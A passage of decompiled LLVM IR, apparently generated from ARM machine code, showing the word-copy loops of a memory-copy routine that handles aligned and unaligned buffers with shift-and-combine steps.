dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d0c
  br i1 %v2_16d90, label %dec_label_pc_16dd8, label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d8c
  store i32 %v1_16d8c, i32* %r2.global-to-local, align 4
  %v3_16d98 = load i32, i32* @r4, align 4
  store i32 %v3_16d98, i32* %stack_var_-16, align 4
  %v6_16d98 = load i32, i32* @r5, align 4
  store i32 %v6_16d98, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge, %dec_label_pc_16d94
  %v0_16dc0 = phi i32 [ %v12_16dc0, %dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge ], [ %v0_16e2c76, %dec_label_pc_16d94 ]
  %v0_16da0 = phi i32 [ %v0_16da0.pre, %dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge ], [ %v4_16d10, %dec_label_pc_16d94 ]
  %v0_16d9c = phi i32 [ %v0_16d9c.pre, %dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge ], [ %v2_16d10, %dec_label_pc_16d94 ]
  %v3_16d9c = udiv i32 %v0_16d9c, 65536
  %v1_16da0 = inttoptr i32 %v0_16da0 to i32*
  %v2_16da0 = load i32, i32* %v1_16da0, align 4
  store i32 %v2_16da0, i32* %r4.global-to-local, align 4
  %v3_16da0 = add i32 %v0_16da0, 4
  %v4_16da0 = inttoptr i32 %v3_16da0 to i32*
  %v5_16da0 = load i32, i32* %v4_16da0, align 4
  store i32 %v5_16da0, i32* %r5.global-to-local, align 4
  %v6_16da0 = add i32 %v0_16da0, 8
  %v7_16da0 = inttoptr i32 %v6_16da0 to i32*
  %v8_16da0 = load i32, i32* %v7_16da0, align 4
  store i32 %v8_16da0, i32* %ip.global-to-local, align 4
  %v9_16da0 = add i32 %v0_16da0, 12
  %v10_16da0 = inttoptr i32 %v9_16da0 to i32*
  %v11_16da0 = load i32, i32* %v10_16da0, align 4
  store i32 %v11_16da0, i32* %lr.global-to-local, align 4
  %v12_16da0 = add i32 %v0_16da0, 16
  store i32 %v12_16da0, i32* %r1.global-to-local, align 4
  %v4_16da4 = mul i32 %v2_16da0, 65536
  %v5_16da4 = or i32 %v4_16da4, %v3_16d9c
  store i32 %v5_16da4, i32* @r3, align 4
  %v3_16da8 = udiv i32 %v2_16da0, 65536
  %v4_16dac = mul i32 %v5_16da0, 65536
  %v5_16dac = or i32 %v4_16dac, %v3_16da8
  store i32 %v5_16dac, i32* %r4.global-to-local, align 4
  %v3_16db0 = udiv i32 %v5_16da0, 65536
  %v4_16db4 = mul i32 %v8_16da0, 65536
  %v5_16db4 = or i32 %v4_16db4, %v3_16db0
  store i32 %v5_16db4, i32* %r5.global-to-local, align 4
  %v3_16db8 = udiv i32 %v8_16da0, 65536
  %v4_16dbc = mul i32 %v11_16da0, 65536
  %v5_16dbc = or i32 %v4_16dbc, %v3_16db8
  store i32 %v5_16dbc, i32* @ip, align 4
  %v1_16dc0 = inttoptr i32 %v0_16dc0 to i32*
  store i32 %v5_16da4, i32* %v1_16dc0, align 4
  %v3_16dc0 = add i32 %v0_16dc0, 4
  %v4_16dc0 = inttoptr i32 %v3_16dc0 to i32*
  %v5_16dc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16dc0, i32* %v4_16dc0, align 4
  %v6_16dc0 = add i32 %v0_16dc0, 8
  %v7_16dc0 = inttoptr i32 %v6_16dc0 to i32*
  %v8_16dc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16dc0, i32* %v7_16dc0, align 4
  %v9_16dc0 = add i32 %v0_16dc0, 12
  %v10_16dc0 = inttoptr i32 %v9_16dc0 to i32*
  %v11_16dc0 = load i32, i32* @ip, align 4
  store i32 %v11_16dc0, i32* %v10_16dc0, align 4
  %v12_16dc0 = add i32 %v0_16dc0, 16
  store i32 %v12_16dc0, i32* %r0.global-to-local, align 4
  %v0_16dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16dc4 = add i32 %v0_16dc4, -16
  store i32 %v1_16dc4, i32* %r2.global-to-local, align 4
  %v3_16dc4 = sub i32 15, %v0_16dc4
  %v4_16dc4 = and i32 %v3_16dc4, %v0_16dc4
  %v5_16dc4 = icmp slt i32 %v4_16dc4, 0
  %v6_16dc4 = icmp slt i32 %v1_16dc4, 0
  %v2_16dc8 = xor i1 %v6_16dc4, %v5_16dc4
  br i1 %v2_16dc8, label %dec_label_pc_16dcc, label %dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge

dec_label_pc_16d9c.dec_label_pc_16d9c_crit_edge:  ; preds = %dec_label_pc_16d9c
  %v0_16d9c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16da0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d9c

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16d9c
  %v2_16dcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16dcc, i32* @r4, align 4
  %v5_16dcc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16dcc, i32* @r5, align 4
  %v1_16dd0 = add i32 %v0_16dc4, -4
  store i32 %v1_16dd0, i32* %r2.global-to-local, align 4
  %v3_16dd0 = add i32 %v0_16dc4, 2147483632
  %v4_16dd0 = and i32 %v1_16dd0, %v3_16dd0
  %v5_16dd0 = icmp slt i32 %v4_16dd0, 0
  store i1 %v5_16dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_16dd0 = icmp slt i32 %v1_16dd0, 0
  store i1 %v6_16dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_16dd0 = icmp eq i32 %v1_16dd0, 0
  store i1 %v7_16dd0, i1* %cpsr_z.global-to-local, align 1
  %v2_16dd4 = xor i1 %v6_16dd0, %v5_16dd0
  br i1 %v2_16dd4, label %dec_label_pc_16df0, label %dec_label_pc_16dd8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dcc, %dec_label_pc_16d8c, %dec_label_pc_16dd8
  %v1_16de4 = phi i32 [ %v4_16de4, %dec_label_pc_16dd8 ], [ %v12_16dc0, %dec_label_pc_16dcc ], [ %v0_16e2c76, %dec_label_pc_16d8c ]
  %v0_16dd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_16dd8 = udiv i32 %v0_16dd8, 65536
  store i32 %v3_16dd8, i32* %ip.global-to-local, align 4
  %v0_16ddc = load i32, i32* %r1.global-to-local, align 4
  %v1_16ddc = inttoptr i32 %v0_16ddc to i32*
  %v2_16ddc = load i32, i32* %v1_16ddc, align 4
  store i32 %v2_16ddc, i32* %lr.global-to-local, align 4
  %v4_16ddc = add i32 %v0_16ddc, 4
  store i32 %v4_16ddc, i32* %r1.global-to-local, align 4
  %v4_16de0 = mul i32 %v2_16ddc, 65536
  %v5_16de0 = or i32 %v4_16de0, %v3_16dd8
  store i32 %v5_16de0, i32* @ip, align 4
  %v2_16de4 = inttoptr i32 %v1_16de4 to i32*
  store i32 %v5_16de0, i32* %v2_16de4, align 4
  %v3_16de4 = load i32, i32* %r0.global-to-local, align 4
  %v4_16de4 = add i32 %v3_16de4, 4
  store i32 %v4_16de4, i32* %r0.global-to-local, align 4
  %v0_16de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16de8 = add i32 %v0_16de8, -4
  store i32 %v1_16de8, i32* %r2.global-to-local, align 4
  %v3_16de8 = sub i32 3, %v0_16de8
  %v4_16de8 = and i32 %v3_16de8, %v0_16de8
  %v5_16de8 = icmp slt i32 %v4_16de8, 0
  %v6_16de8 = icmp slt i32 %v1_16de8, 0
  %v2_16dec = xor i1 %v6_16de8, %v5_16de8
  br i1 %v2_16dec, label %dec_label_pc_16df0.loopexit, label %dec_label_pc_16dd8

dec_label_pc_16df0.loopexit:                      ; preds = %dec_label_pc_16dd8
  %v7_16de8 = icmp eq i32 %v0_16de8, 4
  store i1 %v5_16de8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16de8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16de8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16df0

dec_label_pc_16df0:                               ; preds = %dec_label_pc_16df0.loopexit, %dec_label_pc_16dcc
  %v0_16cac60 = phi i32 [ %v1_16de8, %dec_label_pc_16df0.loopexit ], [ %v1_16dd0, %dec_label_pc_16dcc ]
  %v0_16df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16df0 = add i32 %v0_16df0, -2
  store i32 %v1_16df0, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16d0c
  br i1 %v2_16d90, label %dec_label_pc_16e44, label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16df8
  store i32 %v1_16d8c, i32* %r2.global-to-local, align 4
  %v3_16e04 = load i32, i32* @r4, align 4
  store i32 %v3_16e04, i32* %stack_var_-16, align 4
  %v6_16e04 = load i32, i32* @r5, align 4
  store i32 %v6_16e04, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16e08

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16e08.dec_label_pc_16e08_crit_edge, %dec_label_pc_16e00
  %v0_16e2c = phi i32 [ %v12_16e2c, %dec_label_pc_16e08.dec_label_pc_16e08_crit_edge ], [ %v0_16e2c76, %dec_label_pc_16e00 ]
  %v0_16e0c = phi i32 [ %v0_16e0c.pre, %dec_label_pc_16e08.dec_label_pc_16e08_crit_edge ], [ %v4_16d10, %dec_label_pc_16e00 ]
  %v0_16e08 = phi i32 [ %v0_16e08.pre, %dec_label_pc_16e08.dec_label_pc_16e08_crit_edge ], [ %v2_16d10, %dec_label_pc_16e00 ]
  %v3_16e08 = udiv i32 %v0_16e08, 16777216
  %v1_16e0c = inttoptr i32 %v0_16e0c to i32*
  %v2_16e0c = load i32, i32* %v1_16e0c, align 4
  store i32 %v2_16e0c, i32* %r4.global-to-local, align 4
  %v3_16e0c = add i32 %v0_16e0c, 4
  %v4_16e0c = inttoptr i32 %v3_16e0c to i32*
  %v5_16e0c = load i32, i32* %v4_16e0c, align 4
  store i32 %v5_16e0c, i32* %r5.global-to-local, align 4
  %v6_16e0c = add i32 %v0_16e0c, 8
  %v7_16e0c = inttoptr i32 %v6_16e0c to i32*
  %v8_16e0c = load i32, i32* %v7_16e0c, align 4
  store i32 %v8_16e0c, i32* %ip.global-to-local, align 4
  %v9_16e0c = add i32 %v0_16e0c, 12
  %v10_16e0c = inttoptr i32 %v9_16e0c to i32*
  %v11_16e0c = load i32, i32* %v10_16e0c, align 4
  store i32 %v11_16e0c, i32* %lr.global-to-local, align 4
  %v12_16e0c = add i32 %v0_16e0c, 16
  store i32 %v12_16e0c, i32* %r1.global-to-local, align 4
  %v4_16e10 = mul i32 %v2_16e0c, 256
  %v5_16e10 = or i32 %v4_16e10, %v3_16e08
  store i32 %v5_16e10, i32* @r3, align 4
  %v3_16e14 = udiv i32 %v2_16e0c, 16777216
  %v4_16e18 = mul i32 %v5_16e0c, 256
  %v5_16e18 = or i32 %v4_16e18, %v3_16e14
  store i32 %v5_16e18, i32* %r4.global-to-local, align 4
  %v3_16e1c = udiv i32 %v5_16e0c, 16777216
  %v4_16e20 = mul i32 %v8_16e0c, 256
  %v5_16e20 = or i32 %v4_16e20, %v3_16e1c
  store i32 %v5_16e20, i32* %r5.global-to-local, align 4
  %v3_16e24 = udiv i32 %v8_16e0c, 16777216
  %v4_16e28 = mul i32 %v11_16e0c, 256
  %v5_16e28 = or i32 %v4_16e28, %v3_16e24
  store i32 %v5_16e28, i32* @ip, align 4
  %v1_16e2c = inttoptr i32 %v0_16e2c to i32*
  store i32 %v5_16e10, i32* %v1_16e2c, align 4
  %v3_16e2c = add i32 %v0_16e2c, 4
  %v4_16e2c = inttoptr i32 %v3_16e2c to i32*
  %v5_16e2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16e2c, i32* %v4_16e2c, align 4
  %v6_16e2c = add i32 %v0_16e2c, 8
  %v7_16e2c = inttoptr i32 %v6_16e2c to i32*
  %v8_16e2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16e2c, i32* %v7_16e2c, align 4
  %v9_16e2c = add i32 %v0_16e2c, 12
  %v10_16e2c = inttoptr i32 %v9_16e2c to i32*
  %v11_16e2c = load i32, i32* @ip, align 4
  store i32 %v11_16e2c, i32* %v10_16e2c, align 4
  %v12_16e2c = add i32 %v0_16e2c, 16
  store i32 %v12_16e2c, i32* %r0.global-to-local, align 4
  %v0_16e30 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e30 = add i32 %v0_16e30, -16
  store i32 %v1_16e30, i32* %r2.global-to-local, align 4
  %v3_16e30 = sub i32 15, %v0_16e30
  %v4_16e30 = and i32 %v3_16e30, %v0_16e30
  %v5_16e30 = icmp slt i32 %v4_16e30, 0
  %v6_16e30 = icmp slt i32 %v1_16e30, 0
  %v2_16e34 = xor i1 %v6_16e30, %v5_16e30
  br i1 %v2_16e34, label %dec_label_pc_16e38, label %dec_label_pc_16e08.dec_label_pc_16e08_crit_edge

dec_label_pc_16e08.dec_label_pc_16e08_crit_edge:  ; preds = %dec_label_pc_16e08
  %v0_16e08.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16e0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e08

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e08
  %v2_16e38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16e38, i32* @r4, align 4
  %v5_16e38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16e38, i32* @r5, align 4
  %v1_16e3c = add i32 %v0_16e30, -4
  store i32 %v1_16e3c, i32* %r2.global-to-local, align 4
  %v3_16e3c = add i32 %v0_16e30, 2147483632
  %v4_16e3c = and i32 %v1_16e3c, %v3_16e3c
  %v5_16e3c = icmp slt i32 %v4_16e3c, 0
  store i1 %v5_16e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_16e3c = icmp slt i32 %v1_16e3c, 0
  store i1 %v6_16e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_16e3c = icmp eq i32 %v1_16e3c, 0
  store i1 %v7_16e3c, i1* %cpsr_z.global-to-local, align 1
  %v2_16e40 = xor i1 %v6_16e3c, %v5_16e3c
  br i1 %v2_16e40, label %dec_label_pc_16e5c, label %dec_label_pc_16e44

dec_label_pc_16e44:                               ; preds = %dec_label_pc_16e38, %dec_label_pc_16df8, %dec_label_pc_16e44
  %v1_16e50 = phi i32 [ %v4_16e50, %dec_label_pc_16e44 ], [ %v12_16e2c, %dec_label_pc_16e38 ], [ %v0_16e2c76, %dec_label_pc_16df8 ]
  %v0_16e44 = load i32, i32* %lr.global-to-local, align 4
  %v3_16e44 = udiv i32 %v0_16e44, 16777216
  store i32 %v3_16e44, i32* %ip.global-to-local, align 4
  %v0_16e48 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e48 = inttoptr i32 %v0_16e48 to i32*
  %v2_16e48 = load i32, i32* %v1_16e48, align 4
  store i32 %v2_16e48, i32* %lr.global-to-local, align 4
  %v4_16e48 = add i32 %v0_16e48, 4
  store i32 %v4_16e48, i32* %r1.global-to-local, align 4
  %v4_16e4c = mul i32 %v2_16e48, 256
  %v5_16e4c = or i32 %v4_16e4c, %v3_16e44
  store i32 %v5_16e4c, i32* @ip, align 4
  %v2_16e50 = inttoptr i32 %v1_16e50 to i32*
  store i32 %v5_16e4c, i32* %v2_16e50, align 4
  %v3_16e50 = load i32, i32* %r0.global-to-local, align 4
  %v4_16e50 = add i32 %v3_16e50, 4
  store i32 %v4_16e50, i32* %r0.global-to-local, align 4
  %v0_16e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e54 = add i32 %v0_16e54, -4
  store i32 %v1_16e54, i32* %r2.global-to-local, align 4
  %v3_16e54 = sub i32 3, %v0_16e54
  %v4_16e54 = and i32 %v3_16e54, %v0_16e54
  %v5_16e54 = icmp slt i32 %v4_16e54, 0
  %v6_16e54 = icmp slt i32 %v1_16e54, 0
  %v2_16e58 = xor i1 %v6_16e54, %v5_16e54
  br i1 %v2_16e58, label %dec_label_pc_16e5c.loopexit, label %dec_label_pc_16e44

dec_label_pc_16e5c.loopexit:                      ; preds = %dec_label_pc_16e44
  %v7_16e54 = icmp eq i32 %v0_16e54, 4
  store i1 %v5_16e54, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16e54, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16e54, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16e5c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e5c.loopexit, %dec_label_pc_16e38
  %v0_16cac61 = phi i32 [ %v1_16e54, %dec_label_pc_16e5c.loopexit ], [ %v1_16e3c, %dec_label_pc_16e38 ]
  %v0_16e5c = load i32, i32* %r1.global-to-local, align 4
  %v1_16e5c = add i32 %v0_16e5c, -1
  store i32 %v1_16e5c, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_16e64:                               ; preds = %entry
  %v1_16e64 = load i32, i32* @r2, align 4
  %v2_16e64 = add i32 %v1_16e64, %v0_16c10
  store i32 %v2_16e64, i32* %r1.global-to-local, align 4
  %v2_16e68 = add i32 %v1_16e64, %v1_16c10
  store i32 %v2_16e68, i32* %r0.global-to-local, align 4
  %v2_16e6c = add i32 %v1_16e64, -4
  store i32 %v2_16e6c, i32* %r2.global-to-local, align 4
  %v4_16e6c = sub i32 3, %v1_16e64
  %v5_16e6c = and i32 %v4_16e6c, %v1_16e64
  %v6_16e6c = icmp slt i32 %v5_16e6c, 0
  store i1 %v6_16e6c, i1* %cpsr_v.global-to-local, align 1
  %v7_16e6c = icmp slt i32 %v2_16e6c, 0
  store i1 %v7_16e6c, i1* %cpsr_n.global-to-local, align 1
  %v8_16e6c = icmp eq i32 %v1_16e64, 4
  store i1 %v8_16e6c, i1* %cpsr_z.global-to-local, align 1
  %v5_16e70 = icmp slt i32 %v1_16e64, 4
  br i1 %v5_16e70, label %bb151, label %dec_label_pc_16e74

dec_label_pc_16e74:                               ; preds = %dec_label_pc_16e64
  %v1_16e74 = urem i32 %v2_16e68, 4
  store i32 %v1_16e74, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e74 = icmp eq i32 %v1_16e74, 0
  store i1 %v2_16e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e74, label %dec_label_pc_16e7c, label %dec_label_pc_16f1c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e74
  %v1_16e7c = urem i32 %v2_16e64, 4
  store i32 %v1_16e7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e7c = icmp eq i32 %v1_16e7c, 0
  store i1 %v2_16e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e7c, label %dec_label_pc_16e84, label %dec_label_pc_16f48

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e7c, %dec_label_pc_16f40
  %v0_16e9c37 = phi i32 [ %v2_16e68, %dec_label_pc_16e7c ], [ %v0_16f9020, %dec_label_pc_16f40 ]
  %v0_16e9836 = phi i32 [ %v2_16e64, %dec_label_pc_16e7c ], [ %v0_16f40, %dec_label_pc_16f40 ]
  %v0_16e84 = phi i32 [ %v2_16e6c, %dec_label_pc_16e7c ], [ %v2_16f38, %dec_label_pc_16f40 ]
  %v2_16e84 = add i32 %v0_16e84, -8
  store i32 %v2_16e84, i32* %r2.global-to-local, align 4
  %v4_16e84 = sub i32 7, %v0_16e84
  %v5_16e84 = and i32 %v4_16e84, %v0_16e84
  %v6_16e84 = icmp slt i32 %v5_16e84, 0
  store i1 %v6_16e84, i1* %cpsr_v.global-to-local, align 1
  %v7_16e84 = icmp slt i32 %v2_16e84, 0
  store i1 %v7_16e84, i1* %cpsr_n.global-to-local, align 1
  %v8_16e84 = icmp eq i32 %v0_16e84, 8
  store i1 %v8_16e84, i1* %cpsr_z.global-to-local, align 1
  %v5_16e88 = icmp slt i32 %v0_16e84, 8
  br i1 %v5_16e88, label %dec_label_pc_16ed4, label %dec_label_pc_16e8c

dec_label_pc_16e8c:                               ; preds = %dec_label_pc_16e84
  %v3_16e8c = load i32, i32* @r4, align 4
  %v5_16e8c = inttoptr i32 %v3_16e8c to i8*
  store i8* %v5_16e8c, i8** %stack_var_-8, align 4
  %v8_16e8c = load i32, i32* @lr, align 4
  %v2_16e90 = add i32 %v0_16e84, -28
  store i32 %v2_16e90, i32* %r2.global-to-local, align 4
  %v4_16e90 = sub i32 27, %v0_16e84
  %v5_16e90 = and i32 %v4_16e90, %v2_16e84
  %v6_16e90 = icmp slt i32 %v5_16e90, 0
  store i1 %v6_16e90, i1* %cpsr_v.global-to-local, align 1
  %v7_16e90 = icmp slt i32 %v2_16e90, 0
  store i1 %v7_16e90, i1* %cpsr_n.global-to-local, align 1
  %v8_16e90 = icmp eq i32 %v2_16e84, 20
  store i1 %v8_16e90, i1* %cpsr_z.global-to-local, align 1
  %v5_16e94 = icmp slt i32 %v2_16e84, 20
  br i1 %v5_16e94, label %dec_label_pc_16eb0, label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e8c, %dec_label_pc_16e98.dec_label_pc_16e98_crit_edge
  %v0_16e9c = phi i32 [ %v1_16ea4, %dec_label_pc_16e98.dec_label_pc_16e98_crit_edge ], [ %v0_16e9c37, %dec_label_pc_16e8c ]
  %v0_16e98 = phi i32 [ %v0_16e98.pre, %dec_label_pc_16e98.dec_label_pc_16e98_crit_edge ], [ %v0_16e9836, %dec_label_pc_16e8c ]
  %v1_16e98 = add i32 %v0_16e98, -4
  %v2_16e98 = inttoptr i32 %v1_16e98 to i32*
  %v3_16e98 = load i32, i32* %v2_16e98, align 4
  %v4_16e98 = add i32 %v0_16e98, -8
  %v5_16e98 = inttoptr i32 %v4_16e98 to i32*
  %v6_16e98 = load i32, i32* %v5_16e98, align 4
  store i32 %v6_16e98, i32* %r4.global-to-local, align 4
  %v7_16e98 = add i32 %v0_16e98, -12
  %v8_16e98 = inttoptr i32 %v7_16e98 to i32*
  %v9_16e98 = load i32, i32* %v8_16e98, align 4
  store i32 %v9_16e98, i32* %ip.global-to-local, align 4
  %v10_16e98 = add i32 %v0_16e98, -16
  %v11_16e98 = inttoptr i32 %v10_16e98 to i32*
  %v12_16e98 = load i32, i32* %v11_16e98, align 4
  store i32 %v12_16e98, i32* %lr.global-to-local, align 4
  store i32 %v10_16e98, i32* %r1.global-to-local, align 4
  %v1_16e9c = add i32 %v0_16e9c, -16
  %v2_16e9c = inttoptr i32 %v1_16e9c to i32*
  store i32 %v3_16e98, i32* %v2_16e9c, align 4
  %v4_16e9c = add i32 %v0_16e9c, -12
  %v5_16e9c = inttoptr i32 %v4_16e9c to i32*
  %v6_16e9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16e9c, i32* %v5_16e9c, align 4
  %v7_16e9c = add i32 %v0_16e9c, -8
  %v8_16e9c = inttoptr i32 %v7_16e9c to i32*
  %v9_16e9c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16e9c, i32* %v8_16e9c, align 4
  %v10_16e9c = add i32 %v0_16e9c, -4
  %v11_16e9c = inttoptr i32 %v10_16e9c to i32*
  %v12_16e9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16e9c, i32* %v11_16e9c, align 4
  store i32 %v1_16e9c, i32* %r0.global-to-local, align 4
  %v0_16ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea0 = add i32 %v0_16ea0, -4
  %v2_16ea0 = inttoptr i32 %v1_16ea0 to i32*
  %v3_16ea0 = load i32, i32* %v2_16ea0, align 4
  store i32 %v3_16ea0, i32* @r3, align 4
  %v4_16ea0 = add i32 %v0_16ea0, -8
  %v5_16ea0 = inttoptr i32 %v4_16ea0 to i32*
  %v6_16ea0 = load i32, i32* %v5_16ea0, align 4
  store i32 %v6_16ea0, i32* %r4.global-to-local, align 4
  %v7_16ea0 = add i32 %v0_16ea0, -12
  %v8_16ea0 = inttoptr i32 %v7_16ea0 to i32*
  %v9_16ea0 = load i32, i32* %v8_16ea0, align 4
  store i32 %v9_16ea0, i32* @ip, align 4
  %v10_16ea0 = add i32 %v0_16ea0, -16
  %v11_16ea0 = inttoptr i32 %v10_16ea0 to i32*
  %v12_16ea0 = load i32, i32* %v11_16ea0, align 4
  store i32 %v12_16ea0, i32* %lr.global-to-local, align 4
  store i32 %v10_16ea0, i32* %r1.global-to-local, align 4
  %v1_16ea4 = add i32 %v0_16e9c, -32
  %v2_16ea4 = inttoptr i32 %v1_16ea4 to i32*
  store i32 %v3_16ea0, i32* %v2_16ea4, align 4
  %v4_16ea4 = add i32 %v0_16e9c, -28
  %v5_16ea4 = inttoptr i32 %v4_16ea4 to i32*
  %v6_16ea4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16ea4, i32* %v5_16ea4, align 4
  %v7_16ea4 = add i32 %v0_16e9c, -24
  %v8_16ea4 = inttoptr i32 %v7_16ea4 to i32*
  %v9_16ea4 = load i32, i32* @ip, align 4
  store i32 %v9_16ea4, i32* %v8_16ea4, align 4
  %v10_16ea4 = add i32 %v0_16e9c, -20
  %v11_16ea4 = inttoptr i32 %v10_16ea4 to i32*
  %v12_16ea4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ea4, i32* %v11_16ea4, align 4
  store i32 %v1_16ea4, i32* %r0.global-to-local, align 4
  %v0_16ea8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ea8 = add i32 %v0_16ea8, -32
  store i32 %v2_16ea8, i32* %r2.global-to-local, align 4
  %v6_16eac = icmp slt i32 %v0_16ea8, 32
  br i1 %v6_16eac, label %dec_label_pc_16eb0.loopexit, label %dec_label_pc_16e98.dec_label_pc_16e98_crit_edge

dec_label_pc_16e98.dec_label_pc_16e98_crit_edge:  ; preds = %dec_label_pc_16e98
  %v0_16e98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16eb0.loopexit:                      ; preds = %dec_label_pc_16e98
  %v4_16ea8 = sub i32 31, %v0_16ea8
  %v5_16ea8 = and i32 %v4_16ea8, %v0_16ea8
  %v6_16ea8 = icmp slt i32 %v5_16ea8, 0
  %v7_16ea8 = icmp slt i32 %v2_16ea8, 0
  store i1 %v6_16ea8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16ea8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16eb0

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16eb0.loopexit, %dec_label_pc_16e8c
  %v6_16eb8 = phi i32 [ %v1_16ea4, %dec_label_pc_16eb0.loopexit ], [ %v0_16e9c37, %dec_label_pc_16e8c ]
  %v0_16ec0.pr = phi i32 [ %v2_16ea8, %dec_label_pc_16eb0.loopexit ], [ %v2_16e90, %dec_label_pc_16e8c ]
  %v4_16eb0 = add i32 %v0_16ec0.pr, 16
  %v6_16eb0 = sub i32 0, %v0_16ec0.pr
  %v7_16eb0 = and i32 %v4_16eb0, %v6_16eb0
  %v8_16eb0 = icmp slt i32 %v7_16eb0, 0
  store i1 %v8_16eb0, i1* %cpsr_v.global-to-local, align 1
  %v9_16eb0 = icmp slt i32 %v4_16eb0, 0
  store i1 %v9_16eb0, i1* %cpsr_n.global-to-local, align 1
  %v10_16eb0 = icmp eq i32 %v4_16eb0, 0
  store i1 %v10_16eb0, i1* %cpsr_z.global-to-local, align 1
  %v5_16eb4 = icmp slt i32 %v0_16ec0.pr, -16
  br i1 %v5_16eb4, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_16eb0
  %v6_16eb4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16eb4 = add i32 %v6_16eb4, -4
  %v8_16eb4 = inttoptr i32 %v7_16eb4 to i32*
  %v9_16eb4 = load i32, i32* %v8_16eb4, align 4
  store i32 %v9_16eb4, i32* @r3, align 4
  %v10_16eb4 = add i32 %v6_16eb4, -8
  %v11_16eb4 = inttoptr i32 %v10_16eb4 to i32*
  %v12_16eb4 = load i32, i32* %v11_16eb4, align 4
  store i32 %v12_16eb4, i32* %r4.global-to-local, align 4
  %v13_16eb4 = add i32 %v6_16eb4, -12
  %v14_16eb4 = inttoptr i32 %v13_16eb4 to i32*
  %v15_16eb4 = load i32, i32* %v14_16eb4, align 4
  store i32 %v15_16eb4, i32* @ip, align 4
  %v16_16eb4 = add i32 %v6_16eb4, -16
  %v17_16eb4 = inttoptr i32 %v16_16eb4 to i32*
  %v18_16eb4 = load i32, i32* %v17_16eb4, align 4
  store i32 %v18_16eb4, i32* %lr.global-to-local, align 4
  store i32 %v16_16eb4, i32* %r1.global-to-local, align 4
  %v7_16eb8 = add i32 %v6_16eb8, -16
  %v8_16eb8 = inttoptr i32 %v7_16eb8 to i32*
  store i32 %v9_16eb4, i32* %v8_16eb8, align 4
  %v10_16eb8 = add i32 %v6_16eb8, -12
  %v11_16eb8 = inttoptr i32 %v10_16eb8 to i32*
  %v12_16eb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16eb8, i32* %v11_16eb8, align 4
  %v13_16eb8 = add i32 %v6_16eb8, -8
  %v14_16eb8 = inttoptr i32 %v13_16eb8 to i32*
  %v15_16eb8 = load i32, i32* @ip, align 4
  store i32 %v15_16eb8, i32* %v14_16eb8, align 4
  %v16_16eb8 = add i32 %v6_16eb8, -4
  %v17_16eb8 = inttoptr i32 %v16_16eb8 to i32*
